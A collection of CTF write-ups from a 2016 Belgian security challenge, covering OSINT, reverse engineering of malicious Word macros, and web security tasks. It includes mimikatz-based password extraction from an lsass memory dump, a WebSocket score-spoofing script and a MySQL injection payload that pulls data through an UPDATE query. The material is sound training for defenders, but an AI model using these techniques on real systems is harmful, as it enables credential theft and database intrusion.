        temp_a = ((temp_a >> 1) ^ consta[0+(temp_a & 1)]) ^ seed_array[0x18C+i];

        seed_array[i - 1] = temp_a;
    }

    /* Stage 4: Computing the DWORD value */
    uint32_t temp_b = seed_array[1];
    temp_b = ((((temp_b >> 0xB) ^ temp_b) & 0xFF3A58AD) << 0x7) ^ (temp_b >> 0xB) ^ temp_b;
    uint32_t temp_c = ((temp_b & 0xFFFFDF8C) << 0xF) ^ temp_b;
    uint32_t key = temp_c ^ (temp_c >> 0x12);

    return key;
}

```

Note that we do not have to implement the iteration of a thousand domains, since the bxlb0yz use the first one.


And we get:

```
$ gcc -std=c99 -o bxlb0yz_DGA bxlb0yz_DGA.c 
$ ./bxlb0yz_DGA
1/1/2016: #htigwhmqwphp
2/1/2016: #ugmjynldrgbh
3/1/2016: #anaihgipbdbu
4/1/2016: #grkqejcphtvc
5/1/2016: #lyxpmcyupmyv
6/1/2016: #ylcsoixsotql
7/1/2016: #esprwbufayuj
8/1/2016: #xxnbadraiyysp
9/1/2016: #dgwajeiuavyro
10/1/2016: #qrcpmyohkauoq
11/1/2016: #valovafuyktjp
12/1/2016: #cddkpxebmlifh
13/1/2016: #hlmjyyuvgqmov
14/1/2016: #uwryctbtulgji
15/1/2016: #afbxlurhlejow
16/1/2016: #paqtlblmhphgqo
17/1/2016: #uhesttirnagpnd
18/1/2016: #ivqvxqlqftcpwq
19/1/2016: #ndeugjidoqcdtw
20/1/2016: #tfaefpakmcsdxp
21/1/2016: #ymndniwpuuvwkt
22/1/2016: #mbagrfadehleef
23/1/2016: #rinfaxwppmpcqb
24/1/2016: #lljnwpnbyhpofcp
25/1/2016: #qtsmgqevqepneup
26/1/2016: #ehgclcouxlnsdbi
27/1/2016: #jppbudfimvmnccp
28/1/2016: #pqsxqecvrrwcmei
29/1/2016: #uycwafsqlwblbsv
30/1/2016: #impmfqdekwsxkqd
31/1/2016: #nuylortrbpvdynx
1/2/2016: #ikvbakhjcjcf
2/2/2016: #vienjusowhys
3/2/2016: #bprmsnpkgavg
4/2/2016: #hpeesewudpmt
5/2/2016: #mwrdcwtjldsn
6/2/2016: #auaplhfakthy
7/2/2016: #fcnouacvvuow
8/2/2016: #yobhdwnsuiwlc
9/2/2016: #ewkglxeembtky
10/2/2016: #rttfxwxcwmsdn
11/2/2016: #wcdegxoglroxk
12/2/2016: #dbwjfjappvyat
13/2/2016: #ijginkqbjwgjg
14/2/2016: #vgphajkkxbwaf
15/2/2016: #boygikbooodfr
16/2/2016: #qqelpljxbnjslf
17/2/2016: #vxrkyegmhsfcks
18/2/2016: #jxiwgfvayvexha
19/2/2016: #ofvvpxsvioblgf
20/2/2016: #udtovrxrwyvrsh
21/2/2016: #akhnfkugfmclhk
22/2/2016: #nkxamlkiogooop
23/2/2016: #srlyveheahvmdk
24/2/2016: #mcwqcqmvaprxnkv
25/2/2016: #rkgpkrdhriowkej
26/2/2016: #fjxouhbnyypxeqw
27/2/2016: #krhndirrnelsbsr
28/2/2016: #qomtiwbmjdanunb
29/2/2016: #vwvsqxrxdehwhdb
30/2/2016: #jvnrbnpsclvflhn
31/2/2016: #oewqjogwsyckxfu
1/3/2016: #jbrlpurtrosu
2/3/2016: #wyvotbdamvmi
3/3/2016: #cgjnctauvgmv
4/3/2016: #iyaojohkcehh
5/3/2016: #ngnnrhexkjkb
6/3/2016: #berqvnppjhcm
7/3/2016: #glfpegmkuagk
8/3/2016: #afwgsqjdkvkxk
9/3/2016: #fngfcrapcgkwj
```

### Getting to the other accounts

Now what can we do with these hashtags? What about searching for them?

![Finding tweets that use these hashtags](images/finding_accounts_using_hashtags.png)

Note: This can be automated by using the Twitter Search API. (See below)

In the end, you will end up with 4 twitter accounts that post tweets with those hashtags.

 - @bxlb0yz: We already knew this one
 - @brux90951178
 - @harm41665341
 - @willy36346227

From all these accounts, we can put together a story. Let us have a closer look at the latest tweets from every account.

### Final messages on Twitter

If you decode the latest Twitter messages, you will figure out that they have problems with a rival gang and that they decide to change their way of communicating with customers.

From the final messages, we find that they are talking about the FreeNode IRC.

 * @harm41665341: "# is not only for hashtags" ----> Implies other channel also using the pound symbol
 * @willy36346227 has followed @freenodestaff.
 * @brux90951178: "0x1A0B 0x1A0C 0x1A0D 0x1A29 #node #free"

Where the hexidecimal numbers are pointers to the frequently used IRC ports.

### Going onto IRC

So we know that they are somewhere on the Freenode IRC, but we do not know the name of their channel. What about reusing those hashtags as channel names?

Oh look, there are some people in the channel:

![Joining the channels at the day of the competition](images/joining_the_channels.png)

The user 'bxlbot' seems interesting.

### Getting the file from the bot

If you know XDCC bots on IRC then you are essentially done at this point. If not, you might had to troubleshoot a bit by talking to the bot or research available bot software.

```
/msg bxlbot xdcc send -1
```

![Getting the package list](images/getting_package_list.png)

Open file:

![Package list](images/package_list.png)

Start downloading the files...

```
/msg bxlbot xdcc send 1
/msg bxlbot xdcc send 2
/msg bxlbot xdcc send 3
...
/msg bxlbot xdcc send 18 
```

Looking at the files, we find a particulary interesting one...

![The picture with the flag](images/flag_picture.png)

### Flag

cscb{Haha_I_lied;I_already_ate_the_donuts}


### Automating searching on Twitter

```python
from TwitterSearch import *
import time

hashtags = ["#htigwhmqwphp", "#ugmjynldrgbh", "#anaihgipbdbu", "#grkqejcphtvc", "#lyxpmcyupmyv", "#ylcsoixsotql", "#esprwbufayuj", "#xxnbadraiyysp", "#dgwajeiuavyro", "#qrcpmyohkauoq", "#valovafuyktjp", "#cddkpxebmlifh", "#hlmjyyuvgqmov", "#uwryctbtulgji", "#afbxlurhlejow", "#paqtlblmhphgqo", "#uhesttirnagpnd", "#ivqvxqlqftcpwq", "#ndeugjidoqcdtw", "#tfaefpakmcsdxp", "#ymndniwpuuvwkt", "#mbagrfadehleef", "#rinfaxwppmpcqb", "#lljnwpnbyhpofcp", "#qtsmgqevqepneup", "#ehgclcouxlnsdbi", "#jppbudfimvmnccp", "#pqsxqecvrrwcmei","#uycwafsqlwblbsv", "#impmfqdekwsxkqd", "#nuylortrbpvdynx", "#ikvbakhjcjcf", "#vienjusowhys", "#bprmsnpkgavg", "#hpeesewudpmt", "#mwrdcwtjldsn", "#auaplhfakthy", "#fcnouacvvuow", "#yobhdwnsuiwlc", "#ewkglxeembtky", "#rttfxwxcwmsdn", "#wcdegxoglroxk", "#dbwjfjappvyat", "#ijginkqbjwgjg", "#vgphajkkxbwaf", "#boygikbooodfr", "#qqelpljxbnjslf"]
try:
    for hashtag in hashtags:
        tso = TwitterSearchOrder()
        print "Searching for %s" % hashtag
        tso.add_keyword(hashtag)

        ts = TwitterSearch(
            consumer_key = 'nya~~~~~~n',
            consumer_secret = 'Twitter is so 2010',
            access_token = 'plz give me t0ken',
            access_token_secret = 'sikrit access tokens are sikrit'
         )

        for tweet in ts.search_tweets_iterable(tso):
            print( '@%s tweeted: %s' % ( tweet['user']['screen_name'], tweet['text'] ) )

        time.sleep(5) # flipping rate-limit

except TwitterSearchException as e:
    print(e)
```

```bash
$ python sol.py 
...
Searching for #qqelpljxbnjslf
@brux90951178 tweeted: RG9uJ3QgZm9yZ2V0IHRvIHBhc3MgYnkgdG8gZ2V0IGFuIHVwZGF0ZSBvbiBvdXIgbmV3IHdheSBvZiBjb21tdW5pY2F0aW5nOy #qqelpljxbnjslf https://t.co/I11KDkdxNC
@brux90951178 tweeted: MHgxQTBCIDB4MUEwQyAweDFBMEQgMHgxQTI5ICNub2RlICNmcmVl #qqelpljxbnjslf
Searching for #boygikbooodfr
@harm41665341 tweeted: QmUgc3VyZSB0byBwYXNzIGJ5IHRoaXMgd2VlayB0byBrbm93IHdoZXJlIHdlJ3JlIGdvaW5n #boygikbooodfr https://t.co/vGu8Qf26oO
Searching for #vgphajkkxbwaf
@bxlb0yz tweeted: QnV5IGEgbmljZSBnaWZ0IGZvciB5b3VyIGdpcmwvYm95ZnJpZW5kIHRvZGF5ISAyMCUgMEZGIQ== #vgphajkkxbwaf https://t.co/rUAUayxvIf
@bxlb0yz tweeted: T3VyIGIweXogd2lsbCBsZWF2ZSBoaW50cyBvbiBUd2l0dGVyIG5leHQgd2VlayBhYm91dCBvdXIgbmV3IGNoYW5uZWwhIE9yIGp1c3QgY29tZSB2aXNpdCB1cw== #vgphajkkxbwaf
@bxlb0yz tweeted: V2UgaGF2ZSBkZWNpZGVkIHRvIGNoYW5nZSB0aGUgbWVkaXVtIG9uIHdoaWNoIHdlIGNvbW11bmljYXRlLiBXZSB3aWxsIHN3aXRjaCBuZXh0IHdlZWsu #vgphajkkxbwaf
Searching for #ijginkqbjwgjg
@willy36346227 tweeted: V2UgYXJlIG5vdyBtZWV0aW5nIHVwIHNpbmNlIHdlIGhhdmUgaGFkIHRoaXMgJ3Byb2JsZW0nIGZvciBhIGZldyBkYXlzIG5vdy4gTm90aGluZyB0b25pZ2h0Lg== #ijginkqbjwgjg
Searching for #dbwjfjappvyat
@brux90951178 tweeted: QmFkIGx1Y2s/IEkgdGhpbmsgbm90LiBTb3JyeSBmb3IgaGF2aW5nIHRvIGxlYXZlIGFnYWluIGFmdGVyIDEwbWluLg== #dbwjfjappvyat https://t.co/FZnoOkJUB8
Searching for #wcdegxoglroxk
@harm41665341 tweeted: U29ycnkgZm9yIG9ubHkgYmVpbmcgdGhlcmUgZm9yIDE1bWluLCB5ZXN0ZXJkYXkuIE91ciAnYnVkZGllcycgc2hvd2 #wcdegxoglroxk https://t.co/tDpUgku6LI
Searching for #rttfxwxcwmsdn
@willy36346227 tweeted: QmVzaWRlcyB0aGUgbm9ybWFsIHN0dWZmLCB3ZSBub3cgYWxzbyBoYXZlIGEgc3VwcGx5IG9mIExlZ2FsIFguIFNlZSB5 #rttfxwxcwmsdn https://t.co/Ax6PrwLvJ9
....
```
# Cyber Security Challenge 2016: Find Me

**Category:** OSINT  
**Points:** 25  
**Author:** Vasileios Friligkos
**Description:**
> Bad news @dayjob!
A user has been infected and you need to provide some information about the malware to your CISO asap.
Access to the logs is taking too long and all you have is a URL (proequilibrium dot com).

>Can you take a shot and say what the malware probably is?
(Anti malware vendors tend to use different names, the name we’re looking for is the one used by malwarebytes)

>Hint: If the URL doesn't give any results, how about the IP?



## Write-up
So all we have is a URL: proequilibrium[.]com and we need to guess the malware.
What better way to take a chance than googling it.
 
Ok, not much..
Let’s add some keywords like malware, infection
.. still not much.
 
Well, sometimes the URL may not match with an existing analysis but the IP does.
Resolving the URL gives us the IP: 198.173.254.216
 
Googling about the IP and some relative keywords gives us a virustotal link:
 
https://www.virustotal.com/en/ip-address/198.173.254.216/information/
 
and bingo! Malware files that were downloaded from this IP:

![malwares](images/image01.png)

Last thing to do is click on the first file to see the details, and find the MalwareByte entry.

## Solution
Trojan.Dridex
## Other write-ups and resources
- None yet.
# Cyber Security Challenge 2016 Qualifiers write-ups

* <https://www.cybersecuritychallenge.be/>
* [Scoreboard](https://www.cybersecuritychallenge.be/scoreboard)

## Completed write-ups
### Cryptography
* [BSOD Quote](Cryptography/BSOD-quote) 
* [In a jiffy](Cryptography/In-a-jiffy)
* [This looks random](Cryptography/This-looks-random)
* [What did he say?](Cryptography/What-did-he-say)
* [Where's Waldo?](Cryptography/Wheres-waldo)

### Digital Forensics
* [Are you worthy?](Digital%20Forensics/Are-you-worthy)
* [Caught Before the drug deal](Digital%20Forensics/Caught_Before_The_drug_deal)
* [Rebuild the Hidden Picture](Digital%20Forensics/Rebuild-The-Hidden-Picture)
* [Only two sectors can lead to a criminal](Digital%20Forensics/Only-Two-Sectors-Can-Lead-To-A-Criminal)
* [exFat is not fat](Digital%20Forensics/exFat-is-not-Fat)


### Mobile Security 
* [Phishing is not a crime](Mobile%20Security/Phishing-is-not-a-crime)
* [Dexter](Mobile%20Security/dexter)

### Network Security
* [The Smokescreen Challenge](Network%20Security/Smoke-Screen-Challenge)
* [Insecure](Network%20Security/Insecure)

### OSINT
* [FindMe](OSINT/FindMe)
* [bxlb0yz](OSINT/bxlb0yz)

### Reverse engineering
* [Even the best make mistakes](Reverse%20Engineering/Even-the-best-make-mistakes)
* [Word of the rings](Reverse%20Engineering/Word-of-the-rings)
* [CSC Mainframe](Reverse%20Engineering/CSC-Mainframe)
* [Mindblown](Reverse%20Engineering/Mindblown)

###Web security
* [Use the force Luke](Web%20Security/Use-the-force-Luke)
* [Tap dat ass part 1](Web%20Security/Tap-dat-ass-part1)
* [Tap dat ass part 2](Web%20Security/Tap-dat-ass-Part2)
# Cyber Security Challenge 2016: Csc Mainframe


**Category:** Reverse Engineering  
**Points:** 120  
**Challenge designer:** Jerome Kleinen  
**Description:**  
> Goddamnit. Not only have I lost my Windows password but I also can’t remember my credentials for the CSC mainframe. I still have the application that encrypted my mainframe password, but it’s locked within the VM. Can you help me?

[File Here](https://s3-eu-west-1.amazonaws.com/be.cscbe.challenges/Reverse+Engineering+-+CSC+Mainframe+-+Jerome+Kleinen/CSC_2016_JK_v2.7z)

>Hints: 
>- For the VM: if you rebooted the VM, you might need to extract it again.
>- For the application: have a look at the API used to encrypt the flag. You might need to use a debugger to get all the parameters just right.

## Write-up
There are two parts to this challenge:

####1) Gaining access to the VM

You need to open the VM in VirtualBox. You will need to make a memory image of the current snapshot. There are several ways to do this (see http://wiki.yobi.be/wiki/RAM_analysis from a fellow Belgian security researcher), but this way works best:

- From a command prompt, run the following command (add virtualbox to Path):

`virtualbox --dbg --startvm “CSC”`

- Click debug -> command line and enter .pgmphystofile win8_locked.raw

- convert the memory image to a crashdump file using volatility:

`volatility -f win8_locked.raw --profile=Win8SP0x86 raw2dmp -O win8_locked.dmp`

- Load the crash dump into Windbg x86 (I think this has to be the 32 bit version of Windbg)

- Enter the following commands in windbg:

```
.symfix

.reload

!process 0 0 lsass.exe
```

- This will give you the offset of the process.

```
.process /r /p <offset>

.load mimilib.dll (download latest compiled version of mimikatz from github)

!mimikatz
```

- This will show you the password of the “Jerome” user on the VM: “CSC_2016!!!”. The VM uses a QWERTY layout.

There are other options here as well. You can use KonBoot/PCUnlocker to bypass the lock screen, you can mount the vdi and mess with the hashes, you can do some pass the hash style attacks over a local network etc. You could also grab the hashes using hashdump from volatility and try to crack them, but this might take too long.
 
####2) Decrypting the flag

On the desktop of the VM they find the binary that was used to write the flag to the registry. They need to analyze the binary to find the API and the parameters used to encrypt the password. They will also find the registry key where the encrypted data is stored. The API used is the CryptProtectData API from Microsoft which encrypts data in a way that is can only be decrypted on the same computer, by the same user. Hence the need for the VM.

If you look in IDA you can easily see the parameters. You can see that the OptionalEntropy parameter is Jerome”. You also notice that the size is actually 7 bytes, whereas “Jerome” is only 6 characters. IDA does not display the trailing null byte! Students can guess that a null byte needs to be added, or they can debug the application and check it out in memory to see this properly.

![IDA screeenshot](images/image1.png)

I wrote the following PowerShell script that can decrypt this kind of data:
```powershell
Add-Type -Assembly System.Security

$key = "HKCU:\SOFTWARE\CSC\Mainframe Authenticator\CurrentVersion\Credentials"

if (-Not (Test-Path $key)) { 

	echo "registry key not found!" 

	Exit

}

$SecureStr = (Get-ItemProperty -Path $key)."Data"
$Entropy = [System.Text.Encoding]::ASCII.GetBytes("Jerome`0")

$StringBytes = [Security.Cryptography.ProtectedData]::Unprotect($SecureStr, $Entropy, [Security.Cryptography.DataProtectionScope]::CurrentUser)

$PasswordStr = [System.Text.Encoding]::Unicode.GetString($StringBytes)

Echo $PasswordStr
```

An alternative to this way of working is using the dpapick Python library.

##Solution
You_1337_Revers3r!
## Other write-ups and resources
# Cyber Security Challenge 2016: Even the best make mistakes  
 
**Category:** Reverse Engineering  
**Points:** 40  
**Challenge designer:** Didier Stevens  
**Description:**  
> We suspect [this document](challenge-source-files/Doc1.doc.zip) is trying to drop malware on our network, can you find the url of the malware? The password of the zip file is 'infected'. Remember to never run untrusted files on a non-disposable system!

## Write-up
For this challenge we need to use the tool oledump which is made by the creator of the challenge.
> oledump.py is a program to analyze OLE files (Compound File Binary Format). These files contain streams of data. oledump allows you to analyze these streams.  

Using the `plugin_linear.py` we can solve the challenge in a one liner.

```
$ python oledump.py -p plugin_linear Doc1.doc.zip                             ~/Downloads
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7045 '1Table'
  5:       441 'Macros/PROJECT'
  6:        41 'Macros/PROJECTwm'
  7: M    2504 'Macros/VBA/ThisDocument'
               Plugin: Linear cryptanalysis
                 http://example.com/iejdinfe/oap98dczk.exe
  8:      2599 'Macros/VBA/_VBA_PROJECT'
  9:       522 'Macros/VBA/dir'
 10:      4096 'WordDocument'
```

### Solution
*"http://example.com/iejdinfe/oap98dczk.exe"*

# Cyber Security Challenge 2016: Mindblown 

**Category:** Reverse Engineering  
**Points:** 50  
**Challenge designer:** Mathy Vanhoef  
**Description:**  
> [This binary](challenge-source-files/mindblown64) is running on the server at 52.50.58.101:1337. Try and get the flag!

## Write-up
Let's run the program
```bash
» ./mindblown64
Failed to open flag file (null): Bad address
```
Looks like the program expects a file which hold the flag.  
Lets create an empty file and give it to the program
```bash
» touch flagfile
» ./mindblown64 flagfile
Failed to read 20-character flag from flagfile: Success
```
Now we know the flag is a 20 character string.  
Enter 20 characters into the file and run the program once again.
```bash
» echo '01234567890123456789' > flagfile
» ./mindblown64 flagfile
Alarm clock
```
The program does nothing and then exit after 2-3 seconds.

Investigating the binary in a debugger reveals that it's a "brainfuck" binary that expects "CSCBE16" as encoded input in order to retrieve the flag. The following python snippet generates this:

```python
#!/usr/bin/env python2
print ">".join(["+" * ord(c) for c in "CSCBE16"])
```

```bash
» python solution.py
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>+++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++++++++++++++++++++++++
```

Sending this input to the server IP address and port 1337 reveals the flag:

```bash
» python solution.py | nc 52.50.58.101 1337
You win, the flag is letmeblowyourmindddd
```
# Cyber Security Challenge 2016: Word of the rings 

**Category:** Reverse Engineering  
**Points:** 40  
**Challenge designer:** Dieter Van Den Bosch 
**Description:**  
> Dear Security Analyst,
Many colleagues are alerting that their computer is acting weird, that their system seems to be controlled by someone else. Some are reporting they received an [attachment](challenge-source-files/Word-of-the-rings.doc) via mail with an image of a face of a really strange old guy who looks like he really needs to go to the toilet. That’s all we know!

> Can you figure out the URL where the Remote Access ‘Trojan’ is downloaded? Then we can look in the logs who is infected and block the URL on the firewall and proxy. Thanks!  
> Cheers,
> Your boss  

**Hints:**
> It's all about that base

## Write-up
So you got a suspicious office document to analyze. Priority number 1 is to analyze whether the document is downloading or installing malicious stuff.
This concept is something Security Analysts do every day. The entire challenge is built around showing what defense skills you have and to improve them. Many hacking challenges focus on the offence part, but in the real world you often don’t get to be a famous Russian l33t attacker (sorry for smashing your dreams!). So let’s see how good you are in ‘defence’.

### Getting hands on the code
It seems that you have a MS Word file with BASE64 text. Or at least that what the ‘=’ signs in the end of the string indicate (as it is often used as padding in BASE64).

![youshallnotpass](images/youshallnotpass.png)

When you decode the BASE64 string you get “YouShallNotPassword”. Which is already a hint that you need to enter that string as password somewhere.

Let’s look at the VBA code of the Word-file (ALT+F11). When you want to look at the code it says you need a password, and by now you can guess what it is ;-).

![password](images/password.png)

There are other ways to look at the code. There are command-line tools like oledump from Didier Stevens that help you see & analyze the code without needing the password. Or quick tip: if you have OpenOffice you can also view the code without password restrictions.

But you better learn to analyze the code without the use of any tools. If the evil macro makers knew what they were doing (ok admittedly… many of them don’t) you will have some manual analyzing work.

Just so in this challenge. Analyze it with Oledump and you will get a fake URL to mislead you

```bash
$ python oledump.py -p plugin_http_heuristics.py  Word\ Of\ The\ Rings.doc 
A: word/vbaProject.bin
 A1:       445 'PROJECT'
 A2:        41 'PROJECTwm'
 A3: M   15254 'VBA/ThisDocument'
               Plugin: HTTP Heuristics plugin 
                 http://www.pleasedotheneedfull.ie/TeamViewer.zip
 A4:      3424 'VBA/_VBA_PROJECT'
 A5:      2934 'VBA/__SRP_0'
 A6:       217 'VBA/__SRP_1'
 A7:      4660 'VBA/__SRP_2'
 A8:       392 'VBA/__SRP_3'
 A9:       523 'VBA/dir'
```

### Manually analysing the code
So we’ll have to look manually at the code to solve this puzzle. The first lines of code already give you some big hints:

![code1](images/code1.png)

The unusual variable name *szYomamma* is a tip for where to look. URLDownloadToFileA is a function of the Windows API ‘URL moniker service’, held in urlmon.dll, which you can invoke to download a file. Because this way of downloading is so efficient, this function is sometimes used by real malicious office documents.
A bit googling will tell you that this second argument should hold the URL (and that URL is the flag you need to solve this challenge).  
If you look further at the code, you’ll see that blnTrue is disguised as a ‘Boolean’ VBA Data Type (hence the ‘bln’ prefix) but is actually a string. What’s up with that? And variable ‘URL’ … that’s just too easy, right? 

Further below in the code you can see that the variable URL is filled and used in DownloadURL(). In that sub procedure a URL seems to be downloaded. But what are those BASE64 encoded comments doing there?? Decoding the comments will give you ‘fake’ and ‘Faaaaaaake’. I don’t think it gets any clearer then that ;-).

![code2](images/code2.png)
…
![code3](images/code3.png)

So the blue marked code and the DownloadURL sub procedure are fake. That leaves the yellow marked code. If you analyze the code you will see that ‘Document_initiate’ is actually a sub procedure to fill the real URL variable blnTrue and the function with the innocent name ‘Unpack’ is actually the function to download the file behind that URL. So let’s find out what the real URL is …

### Searching for the URL
If you try to sniff with Wireshark from which URL the RAT is downloaded you will be disappointed: the URL is downloaded via HTTPS. Nevertheless you will even find in the SSL traffic a part of the full URL!

![wireshark](images/wireshark.png)

Many people think that nobody can sniff what sites & servers you are connecting with when you use HTTPS. However, during the SSL handshake, the remote domain name is transferred over the wire in plain text! Anyone able to sniff the traffic can know exactly what domains you're looking at, even when you're using HTTPS. The DNS traffic (which is mostly clear text) & the rest of the TLS handshake also gives you many clues.

Above you learned variable ‘blnTrue’ contained the real URL that you’re searching for, so let’s search where that variable is filled. There are other functions in the code to mislead you, but doing a simple string search will teach you that these functions are simply not invoked.

![code4](images/code4.png)

blnTrue is filled with vbaTrue, but as this is the only place where vbaTrue is mentioned in the code you know vbaTrue is actually empty and is just a way to fool you into thinking it’s a Boolean value cfr. vbTrue (notice the difference) IS used for Boolean operations. 
If you know a bit about VBA you know the underscore ‘\_’ is a way to get a long statement on multiple lines. So everything after the underscore still belongs to the same statement. So blnTrue is actually filled what all these strange `Chr(StrReverse("86H&"))` things. Decoding this is actually really simple, but you have to do it manually because no tool is able to help you for this. Reversing the string will give you ‘&H68’ which stands for the ASCII character of letter ‘h’. Decode these ASCII characters and you will get the flag you are searching for: **‘https://download.teamviewer.com/download/TeamViewerPortable.zip’**. 
Halelujah! You have made it safely out of Mordor and conquered the Word of the Rings! 

### Why use TeamviewerPortable as as Remote Access Trojan?
Because it works so simple as a proof-of-concept:
* It works in most companies unless they explicitly deny it in their next-generation firewall or their anti-virus. 
* During the challenge there is no hassle with anti-virus products firing or callback servers being hacked by other teams ;-).

But be advised … it is not so hard to do other stuff in evil macro’s like FTP, downloading evil RAT’s, embedding malware, calling home for commands, …

# Cyber Security Challenge 2016: Tap dat ass part 1


**Category:** Web Security  
**Points:** 40  
**Challenge designer:** Tom Van Goethem  
**Description:**  
> The first part of this challenge is simple, all you need to do is smack enough asses, and you will be presented with a flag!
> 
> Note: this challenge is built with some of the latest and coolest HTML features. If it does not work in your browser, try using the latest Chrome version.

[File Here](challenge-source-files/src.zip)

>Hint: WebSockets are so much fun! You should try it out for yourself!

## Write-up
- lacking server-side validation should be one of the first things one should check

By looking at the server-side code, we can see that the first flag will be sent if our score is higher than 9000 in a certain round. Unfortunately, this is rather hard, if not impossible, to do by hand. 
There are a few options we can use, but they all come down to the same thing: we need to set up a WebSocket connection with the server by ourselves, and fake our score.

In our browser console, we can enter following code to set up the WebSocket, set the difficulty level to a very high number, and fake a "tap".

```js
var ws = new WebSocket('ws://' + window.location.hostname + ':' + window.location.port + '/ass-tapping');
ws.addEventListener('open', function() {
   ws.send(JSON.stringify({
        "action": "updateDifficulty",
        "parameter": {
            "playerId": "FOOBAR123", // can be pretty much any value
            "difficulty": 31337
        }
    }));
});
ws.addEventListener('message', function(msg) {
    var data = JSON.parse(msg.data);
    if (data.action == 'firstFlag') {
        ws.close();
        alert('Flag: ' + data.parameter);
    }
    else if (data.action == 'update') {
        var round = data.parameter.round;
        ws.send(JSON.stringify({
            "action": "increaseScore",
            "parameter": {
                "playerId": "FOOBAR123",
                "roundNumber": round // this has to to match the actual round number
            }
        }));
    }
});
```
The server will then spit out the flag.
 
##Solution
d0nk3ys_h4v3_s0uls_4s_w3ll
## Other write-ups and resources
# Cyber Security Challenge 2016: Tap dat ass part 2


**Category:** Web Security  
**Points:** 80  
**Challenge designer:** Tom Van Goethem  
**Description:**  
> The second part will be slightly harder. We know that one of the hard-working PhD students from the University of Leuven wanted to test the challenge. However, the idiot registered with the second flag in his nickname. Hopefully your 31337 h4x0r sk1llz are sufficient to retrieve this flag!
> 
> Note: this challenge is built with some of the latest and coolest HTML features. If it does not work in your browser, try using the latest Chrome version.

[File Here](challenge-source-files/src.zip)

>Hint: WebSockets are so much fun! You should try it out for yourself!

## Write-up
Looking at the queries that are being made, we see that there is one that sort-of stands out since it's the only one that uses a user-defined escape function (`escapeStr`):

```js
connection.query('UPDATE difficulties SET difficulty = ' + escapeStr(param.difficulty) + " WHERE playerId = '" + escapeStr(param.playerId + "'"), function(err, result) {
    console.log('Updated difficulty for ' + param.playerId + ' to ' + param.difficulty);
    connection.release();
});
```

Looking at the `escapeStr` definition, we can see that it removes certain characters from the input, including quotes. This means that we can't escape the string sequence for `playerId`. However, since the program expects the `param.difficulty` to be numerical, it did not encode the value with strings. This means that we should inject our exploit in `param.difficulty`.
Another difficulty will be that the injectable parameter is in an `UPDATE` query, errors are not returned to the user, and finally the parameter is cast to an `INT` (because of the type of the column).
As a first part of the exploit, we will need to update the difficulty. That's actually quite easy, as we already did that in Part 1. Next, we'll need to bypass a simple (a wrong) check that the provided value is an integer (as we'll obviously need to inject a string to do the SQL injection): `parseInt(param.difficulty) > 0`.
Interestingly, `parseInt` will return a value other than `0` when the string starts with a numerical value. Great. So then we know that we have to start the `difficulty` parameter with a numerical value.

From the queries in app.js, it seems that `difficulties` only has two columns: `playerId` and `difficulty`. Since we can only retrieve the value of the `difficulty` column (since `playerId` is only used in `WHERE` clauses), we will have to use that one to extract content.
It's also important to note that when we set two columns with the same name in an `UPDATE` query, MySQL will use the latter value. This means that we can do inject like `1, difficulty = 1337`, which will result in `difficulty` being set to `1337`.

The challenge description hints that the flag is somewhere in the highscores, located in a player's name. To be able to extract it, we will need to use a subquery to extract it, something like `1, difficulty = (SELECT playerName FROM highscores LIMIT 1)`. However, that will probably result in 0, as the value is implicitly cast to an integer. To bypass this, we can use the MySQL functions `HEX` and `CONV`. First, we convert the string to a hexadecimal representation using `HEX`, and then we convert this value to a decimal representation using `CONV`: `1, difficulty = (SELECT CONV(HEX(playerName), 16, 10) FROM highscores LIMIT 1)`. To prevent integer overflow, we'll have to use `SUBSTRING`, so our exploit then becomes `1, difficulty = (SELECT CONV(HEX(SUBSTRING(playerName, 1, 4), 16, 10) FROM highscores LIMIT 1)`.

After this, all we have to do is set up the WebSocket connection, make the appropriate calls, and convert the integer value back to their string representation. The complete solution can be found [here](challenge-source-files/part2.js) (should be run in your browser console).
 
##Solution
sql\_injection\_taps\_asses\_all\_the\_time
## Other write-ups and resources
# Cyber Security Challenge 2016: Use the force Luke

**Category:** Web security  
**Points:** 40  
**Challenge designer:** Xavier Mertens  
**Description:**  
> The access to the flag has been locked by the Empire. To unlock the website, try to use the force but not the "brute" force ;-). There is nothing to break, nothing hidden. Just try to learn how the website replies to your submitted data, use your hearing!

> Hint: Do you know the "Emperor Arrives" theme?

## Write-up
This challenge does not require high technical reverse engineering or crypto skills. The player must be able to understand how the application reacts depending on the submitted data. Scripting skills are a plus to automate the discovery of patterns.

When the player visits the challenge page for the first time, he sees an HTML form with a text field and the "Play" button. By doing a view source, the player will see that the field is limited to maximum two characters. By sending some random values, he will receive the message "Unknown code". If he sends a music note ('do', 're', 'mi', ...), he gets another message: "Wrong choice". At that point, the player must understand that music notes are expected. If a correct note is entered, the message "Go Ahead" is displayed. This means that the application is expecting the next correct note. When a correct note is received, a cookie called 'melody' is created which contains the current melody base64 encoded. This cookie has a very limited lifetime (15 seconds). If the player waits too long to enter the next note or if a wrong one is selected, the cookie is deleted and the player must start over.

The goal is to play the "Emperor Arrives" theme (http://www.musicnotes.com/sheetmusic/mtd.asp?ppn=MN0149859 - starting from "Marcato"). If the player has some music knowledge and he can read partitions, it will deduce the notes to use, otherwise, he can try to script the submission of notes one by one. The expected notes sequence is: LA-LA-LA-LA-MI-DO-LA-MI-DO-LA.

The key is displayed when all the notes have been submited in the correct order.

Note: a clever player can enable a debug mode by adding the parameter "?debug=1". In this mode, the current recorded melody is display and help him to understand the challenge.
## Other write-ups and resources
# Def Con CTF Qualifiers : 334, 666, 1000 cuts

**Category:** Cgc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://ctf.rip/defcon-2016-cgc/
* http://bof.kr/220717191628
# Def Con CTF Qualifiers : easy-prasky

**Category:** Cgc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://fadec0d3.blogspot.de/2016/05/defcon-ctf-quals-2016-easy-prasky.html
* http://s0ngsari.tistory.com/entry/Defcon-24-easyprasky
# Def Con CTF Qualifiers : LEGIT_00002

**Category:** Cgc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

